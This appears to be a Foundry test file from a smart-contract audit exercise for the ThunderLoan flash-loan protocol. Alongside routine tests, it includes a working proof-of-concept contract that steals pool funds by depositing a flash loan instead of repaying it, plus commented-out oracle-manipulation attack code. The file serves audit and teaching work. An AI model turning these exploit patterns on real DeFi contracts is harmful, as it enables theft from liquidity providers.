// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { ERC20Mock } from "../mocks/ERC20Mock.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver} from "../../src/interfaces/IFlashLoanReceiver.sol";
import { ThunderLoan } from "../../src/protocol/ThunderLoan.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ThunderLoanUpgraded} from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    function testRedeemAfterLoan() public setAllowedToken hasDeposits{
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee); //
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
    }

    // function testOracleManipulation() public {
    //     //1.Set Up Contracts!
    //     thunderLoan = new ThunderLoan();
    //     tokenA = new ERC20Mock();
    //     proxy = new ERC1967Proxy(address(thunderLoan), "");
    //     BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
    //     //Create a tswap DEx between weth / TokenA
    //     address tswapPool = pf.createPool(address(tokenA));
    //     thunderLoan = ThunderLoan(address(proxy));
    //     thunderLoan.initialize(address(pf));

    //     //2. Fund TSwap
    //     vm.startPrank(liquidityProvider);
    //     tokenA.mint(liquidityProvider, 100e18);
    //     tokenA.approve(address(tswapPool), 100e18);
    //     weth.mint(liquidityProvider, 100e18);
    //     weth.approve(address(tswapPool), 100e18);
    //     BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
    //     vm.stopPrank();
    //     //Ratio 100 WETH & 100 TokenA
    //     // Price: 1:1

    //     //3. Fund Thunderloan
    //     vm.prank(thunderLoan.owner());
    //     thunderLoan.setAllowedToken(tokenA, true);
    //     vm.startPrank(liquidityProvider);
    //     tokenA.mint(liquidityProvider, 1000e18);
    //     tokenA.approve(address(thunderLoan), 1000e18);
    //     thunderLoan.deposit(tokenA, 1000e18);
    //     vm.stopPrank();

    //     //1000 TokenA in ThunderLoan
    //     //Take out a flashloan of 50 tokenA
    //     //swap it on the dex, tanking the price > 150 TokenA -> ~80 WETH
    //     //Take out ANOTHER flashloan of 50 tokenA (and we'll see how much cheaper it is!!)


    //     //4. We are going to atke out 2 flash loan
    //         // a. to nuke the price of the weth/tokenA on TSwap
    //         // b. to show that doing so greatly reduced the fees we pay on thunderloan
    //     uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
    //     console2.log("Normal Fee is: ", normalFeeCost);

    //     //0.296147410319118389

    //     uint256 amountToBorrow = 50e18; //we gona do this twice
    //     MalicousFlashLoanReceiver flr = new MalicousFlashLoanReceiver(address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)));

    //     vm.startPrank(user);
    //     tokenA.mint(address(flr), 100e18);
    //     thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
    //     vm.stopPrank();

    //     uint256 attackFee = flr.feeOne() + flr.feeTwo();
    //     console2.log("Attack fee is: ", attackFee);
    //     assert(attackFee < normalFeeCost);

    // }

    // function testUseDepositInsteadofRepayToStealFunds() public setAllowedToken hasDeposits {
    //     vm.startPrank(user);
    //     uint256 amountToBorrow = 50e18;
    //     uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
    //     DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
    //     tokenA.mint(address(dor), fee);
    //     thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
    //     dor.redeemMoney();
    //     vm.stopPrank();

    //     assertEq(tokenA.balanceOf(address(dor)), 50e18 + fee);

    // } 

    
    function testUpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgarde = thunderLoan.getFee();

        console2.log("Fee before: ", feeBeforeUpgrade);
        console2.log("Fee after: ", feeAfterUpgarde);
        assert(feeBeforeUpgrade != feeAfterUpgarde);
    }
}

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan){
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    )
        external
        returns (bool)
        {
            s_token = IERC20(token);
            assetToken = thunderLoan.getAssetFromToken(IERC20(token));
            IERC20(token).approve(address(thunderLoan), amount + fee);
            thunderLoan.deposit(IERC20(token), amount + fee);
            return true;
        }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }

}


// contract MalicousFlashLoanReceiver is IFlashLoanReceiver {
//     ThunderLoan thunderLoan;
//     address repayAddress;
//     BuffMockTSwap tswapPool;
//     bool attacked;
//     uint256 public feeOne;
//     uint256 public feeTwo;

//     constructor(address _tswapPool, address _thunderLoan, address _repayAddress){
//         thunderLoan = ThunderLoan(_thunderLoan);
//         tswapPool = BuffMockTSwap(_tswapPool);
//         repayAddress = _repayAddress;
//     }

//     function executeOperation(
//         address token,
//         uint256 amount,
//         uint256 fee,
//         address /*initiator*/,
//         bytes calldata /*params*/
//     )
//         external
//         returns (bool)
//         {
//             if(!attacked){
//                 //1. Swap TokenA Borrowed for weth
//                 //2. Take out ANOTHER flash loan to know the difference
//                 feeOne = fee;
//                 attacked = true;
//                 uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
//                 IERC20(token).approve(address(tswapPool), 50e18);
//                 tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
//                 // we call a second flash loan!!!!
//                 IERC20 myInterface = IERC20(token);
//                 thunderLoan.flashloan(address(this), myInterface, amount, "");
//                 //thunderLoan.flashloan(address(this), IERC20(token), amount, "");
//                 // repay
//                 // IERC20(token).approve(address(thunderLoan), amount + fee);
//                 // thunderLoan.repay(IERC20(token), amount + fee);
//                 IERC20(token).transfer(address(repayAddress), amount + fee);
//             } else{
//                 //caluclate the fee and repay
//                 feeTwo = fee;
//                 // repay
//                 // IERC20(token).approve(address(thunderLoan), amount + fee);
//                 // thunderLoan.repay(IERC20(token), amount + fee);
//                 IERC20(token).transfer(address(repayAddress), amount + fee);
//             }
//             return true;
//         }

// }
